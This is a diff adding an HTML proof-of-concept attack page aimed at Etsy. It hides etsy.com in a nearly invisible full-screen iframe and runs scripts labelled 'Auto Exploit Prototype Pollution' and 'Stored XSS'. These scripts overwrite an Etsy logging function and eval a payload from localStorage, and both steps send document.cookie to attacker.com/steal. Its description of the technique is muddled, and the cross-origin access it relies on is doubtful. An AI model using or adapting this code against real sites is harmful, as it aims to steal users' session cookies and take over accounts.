@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01; /* Invisible iframe */
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Auto-executing iframe -->
+    <iframe id="targetIframe" src="https://etsy.com" sandbox="allow-scripts allow-same-origin"></iframe>
+
+    <script>
+        window.onload = function() {
+            let iframe = document.getElementById("targetIframe").contentWindow;
+
+            // Wait for iframe to load before executing
+            setTimeout(() => {
+                try {
+                    // **Step 1: Auto Exploit Prototype Pollution**
+                    iframe.window.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
+                        fetch("https://attacker.com/steal?data=" + encodeURIComponent(document.cookie));
+                    };
+                    iframe.window.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");
+
+                    // **Step 2: Auto Execute Stored XSS from LocalStorage**
+                    iframe.localStorage.setItem("xss_payload", "fetch('https://attacker.com/steal?data=' + document.cookie);");
+                    const payload = iframe.localStorage.getItem("xss_payload");
+                    if (payload) {
+                        iframe.eval(payload); // Auto-execute the stored XSS payload
+                    }
+                } catch (e) {
+                    console.log("Exploit failed:", e);
+                }
+            }, 3000); // Slight delay to ensure iframe is fully loaded
+        };
+    </script>
+
+</body>
+</html>
